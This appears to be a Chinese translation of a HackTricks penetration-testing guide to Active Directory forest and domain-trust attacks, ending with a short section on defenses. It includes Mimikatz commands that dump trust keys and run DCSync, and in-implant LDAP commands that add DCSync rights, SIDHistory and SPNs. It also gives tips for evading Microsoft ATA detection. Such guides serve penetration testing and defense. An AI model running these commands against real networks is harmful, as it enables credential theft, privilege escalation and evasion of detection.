它会在 AD 中注册一个**新的 Domain Controller**，并利用它在指定对象上**推送属性**（如 SIDHistory、SPNs 等），在**不留下关于修改的日志**的情况下进行操作。你**需要 DA** 权限并处于**根域**内。\
注意如果你使用了错误的数据，会产生相当难看的日志。

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

前面我们讨论了如果你有**足够的权限读取 LAPS 密码**时如何提升权限。然而，这些密码也可以用于**维持持久化**。\
参见：

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻破单个域可能导致整个 Forest 被攻破**。

### Basic Information

一个 [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个**域**的用户访问另一个**域**中的资源。它本质上在两个域的身份验证系统之间建立了联系，使身份验证验证可以顺利流动。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留特定的**密钥**，这些密钥对于信任的完整性至关重要。

在典型场景中，如果用户打算访问**受信任域**中的服务，他们必须先从自己的域的 DC 请求一种特殊的票据，称为 **inter-realm TGT**。该 TGT 使用两个域之间约定的共享**密钥**进行加密。然后用户将此 TGT 提交给**受信任域的 DC**以获取服务票据（**TGS**）。在受信任域的 DC 验证 inter-realm TGT 有效后，它会颁发 TGS，从而授予用户对该服务的访问权限。

**步骤**：

1. **客户端计算机**在 **Domain 1** 中开始该过程，使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 如果客户端验证成功，DC1 会颁发新的 TGT。
3. 客户端随后从 DC1 请求一个用于访问 **Domain 2** 资源的 **inter-realm TGT**。
4. inter-realm TGT 使用 DC1 与 DC2 在双向域信任中共享的**信任密钥**进行加密。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的信任密钥验证 inter-realm TGT，如果有效，则为客户端想要访问的 Domain 2 中的服务器颁发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提供给服务器，该 TGS 使用服务器账户的 hash 进行加密，以获取对 Domain 2 中服务的访问。

### Different trusts

需要注意的是，**信任可以是单向或双向的**。在双向选项中，两个域会相互信任，但在**单向**信任关系中，其中一个域是**被信任方**，另一个是**信任方**。在后一种情况下，**你只能从被信任域访问信任域内的资源**。

如果 Domain A 信任 Domain B，则 A 是信任域，B 是被信任域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 forest 内的常见设置，子域会自动与其父域建立双向的传递信任。实质上，这意味着身份验证请求可以在父域和子域之间无缝流动。
- **Cross-link Trusts**：也称为 "shortcut trusts"，这些信任在子域之间建立以加速引用过程。在复杂的 forest 中，身份验证引用通常需要上行到 forest 根然后再下行到目标域。通过创建 cross-links，可以缩短此路径，尤其在地理分散的环境中非常有用。
- **External Trusts**：这些在不同且不相关的域之间建立，具有非传递性。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 对于访问不在当前 forest 且未通过 forest trust 连接的域中的资源很有用。通过对外部信任启用 SID 过滤可以增强安全性。
- **Tree-root Trusts**：这些信任自动在 forest 根域与新添加的 tree root 之间建立。虽然不常见，但 tree-root trusts 对于将新的域树添加到 forest 十分重要，使其能够保持唯一域名并确保双向传递性。更多信息可见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：此类信任是在两个 forest 根域之间建立的双向传递信任，同时也强制执行 SID 过滤以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows 的、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专业，适用于需要与 Windows 生态之外的 Kerberos 基础系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系还可以是**传递性的**（例如 A 信任 B，B 信任 C，则 A 信任 C）或**非传递性的**。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（只有一方信任另一方）。

### Attack Path

1. **枚举**信任关系
2. 检查是否有任何**security principal**（user/group/computer）对**另一个域**的资源具有**访问权**，可能通过 ACE 条目或通过成为另一个域的组成员。查找**跨域的关系**（信任可能是为此而创建的）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **攻破**那些能够**跨域 pivot**的**账户**。

攻击者可以通过三种主要机制访问另一个域的资源：

- **Local Group Membership**：主体可能被添加到机器上的本地组（例如服务器的 “Administrators” 组），从而授予他们对该机器的显著控制权。
- **Foreign Domain Group Membership**：主体也可以成为外域中的组成员。然而，该方法的有效性取决于信任的性质和组的范围。
- **Access Control Lists (ACLs)**：主体可能在 **ACL** 中被指定，特别是在 **DACL** 中的 **ACE** 实体，从而为他们提供对特定资源的访问。如果想深入了解 ACL、DACL 和 ACE 的工作机制，白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 是一份宝贵资源。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将来自**外部域/forest**的用户/组。

你可以在 **Bloodhound** 中检查此项或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 存在 **2 个受信任的密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_.\
> 你可以使用以下命令查看当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

滥用信任通过 SID-History injection 将权限提升为 Enterprise admin 到 child/parent domain：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration Naming Context (NC) 非常关键。Configuration NC 在 Active Directory (AD) 环境中作为跨林的配置数据中央存储库。该数据会复制到林内的每个 Domain Controller (DC)，可写的 DC 会保有 Configuration NC 的可写副本。要利用这一点，必须在某个 DC 上拥有 **SYSTEM privileges on a DC**，最好是子域的 DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含有关 AD 林中所有加入域的计算机站点的信息。通过在任一 DC 上以 SYSTEM 权限操作，攻击者可以将 GPO 链接到 root DC site。这一操作可能通过操纵应用于这些站点的策略来危及根域。

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

一种攻击向量是针对域内有特权的 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任何 DC 上拥有 SYSTEM 权限时，可以访问 KDS Root key 并计算整个林中任意 gMSA 的密码。

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

该方法需要耐心，等待创建新的有特权的 AD 对象。具有 SYSTEM 权限时，攻击者可以修改 AD Schema，授予任何用户对所有类的完全控制权。这可能导致对新创建 AD 对象的未授权访问和控制。

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对公钥基础设施 (PKI) 对象的控制，创建一个证书模板，使其能够以林内任意用户的身份进行认证。由于 PKI 对象位于 Configuration NC 中，攻陷可写的子 DC 可以执行 ESC5 攻击。

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). 在没有 ADCS 的场景中，攻击者也可以部署所需组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中 **你的域被一个外部域信任**，并赋予你对其的 **未确定权限**。你需要找出 **你的域中的哪些主体对外部域拥有何种访问权限**，然后尝试利用它们：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这个场景中，**你的域** 正在将一些 **权限** 授予来自 **不同域** 的主体。

然而，当一个 **域被信任**（被信任域）被信任域所信任时，被信任域会**创建一个具有可预测名称的用户**，并使用**受信任的密码**作为该用户的**密码**。这意味着可以**访问来自信任域的用户以进入被信任域**，对其进行枚举并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻破被信任域的方法是找到在域信任的**相反方向**创建的[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种攻破被信任域的方法是等待位于一台**受信任域的用户可以通过** **RDP** 登录的机器上。然后，攻击者可以在 RDP 会话进程中注入代码，并从中**访问受害者的源域**。此外，如果**受害者挂载了他的硬盘**，攻击者可以通过 **RDP 会话** 进程将**后门**存放到该硬盘的**启动文件夹**中。该技术被称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 借助 SID history 属性跨林信任发起攻击的风险可以通过 SID Filtering 缓解，SID Filtering 在所有林间信任（inter-forest trusts）上默认启用。这基于微软的立场，即将林（forest）而非域视为安全边界，因此认为林内信任是安全的。
- 不过有个问题：SID filtering 可能会影响应用和用户访问，因此有时会被停用。

### **Selective Authentication:**

- 对于林间信任，使用 Selective Authentication 可确保来自两个林的用户不会被自动认证。相反，用户需要被明确授权才能访问信任域或林内的域和服务器。
- 需要注意的是，这些措施无法防护对可写的 Configuration Naming Context (NC) 的利用，也无法防护对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 基于 LDAP 的 AD 滥用（On-Host Implants）

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD-style 的 LDAP 原语重新实现为在主机植入体内完全运行的 x64 Beacon Object Files（例如 Adaptix C2）。操作者用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该包，加载 `ldap.axs`，然后在 beacon 中调用 `ldap <subcommand>`。所有流量都使用当前登录的安全上下文通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（自动证书信任）传输，因此不需要 socks 代理或磁盘痕迹。

### 植入端 LDAP 枚举

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名称/OU 路径解析为完整 DN 并导出相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 从 `rootDSE` 拉取任意属性（包括安全描述符）以及林/域元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露出 roasting candidates、委派设置和现有 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出受托人、权限（GenericAll/WriteDACL/WriteOwner/attribute writes）和继承信息，为基于 ACL 的权限提升提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提权与持久化

- 对象创建 BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在存在 OU 权限的任何位置布置新的主体或计算机账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 一旦发现 write-property 权限便可直接劫持目标。
- 针对 ACL 的命令，例如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync` 将任何 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 痕迹。`remove-*` 对应命令用于清理注入的 ACE。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 立即使被攻陷的用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）在不触及密码的情况下将其标记为可进行 AS-REP roasting。
- 委派宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SIDs 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，使攻击者能够将资产移入已有委派权限的 OU，然后滥用 `set-password`、`add-groupmember` 或 `add-spn`。
- 范围严格限制的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 等）允许操作者在收集凭证或持久化后快速回滚，从而最小化遥测。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**在此了解有关如何保护凭证的更多信息。**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录到 Domain Controllers，避免在其他主机上使用。
- **服务账户权限**：服务不应以 Domain Admin (DA) 权限运行以保持安全。
- **临时权限限制**：对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现： `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay 缓解**：审计事件 ID 2889/3074/3075，然后在 DCs/客户端上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **部署欺骗技术**

- 部署欺骗涉及设置陷阱，例如诱饵用户或计算机，具备不失效的密码或被标记为 Trusted for Delegation 等特性。详细方法包括创建具有特定权限的用户或将其添加到高特权组。
- 一个实际示例涉及使用工具，例如： `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **识别欺骗**

- **针对用户对象**：可疑指示包括非典型的 ObjectSID、登录次数稀少、创建日期，以及较低的错误密码计数。
- **一般指示**：将潜在诱饵对象的属性与真实对象进行比较可以揭示不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **绕过检测系统**

- **绕过 Microsoft ATA 检测**：
- **User Enumeration**：避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **Ticket Impersonation**：使用 **aes** 密钥创建票据有助于逃避检测，因为不会降级到 NTLM。
- **DCSync 攻击**：建议从非 Domain Controller 执行以避免 ATA 检测，因为直接从 Domain Controller 执行会触发警报。

## 参考资料

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
